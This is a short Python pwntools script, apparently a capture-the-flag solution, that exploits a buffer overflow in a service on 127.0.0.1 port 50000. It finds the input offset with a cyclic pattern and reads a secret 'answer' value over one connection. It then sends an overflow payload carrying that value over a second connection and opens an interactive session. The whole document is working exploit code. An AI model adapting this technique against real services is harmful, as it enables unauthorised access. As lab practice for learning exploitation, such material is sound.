from pwn import *

#Find offset in input
r0 = remote('127.0.0.1', 50000)
r0.sendline(b"1")
r0.sendline(cyclic(31))
r0.sendline(b"2")
r0.sendline(b"\x00")
r0.recvuntil(b"You entered")
offset = cyclic_find(p32(int(r0.recvuntil(b",")[:-1])))
print(offset)
r0.close()

r1 = remote('127.0.0.1', 50000)
r2 = remote('127.0.0.1', 50000)
r1.sendline(b"2")
r1.recvuntil(b"What is")
r1.sendline(b"2")
r1.recvuntil(b"answer is ")
ans = r1.recvline()[:-1]

r2.sendline(b"1")
r2.sendline(offset*b"A" + p64(int(ans)))
r2.sendline(b"2")
r2.recvuntil(b"What is")
r2.sendline(b"\x00")
r2.interactive()
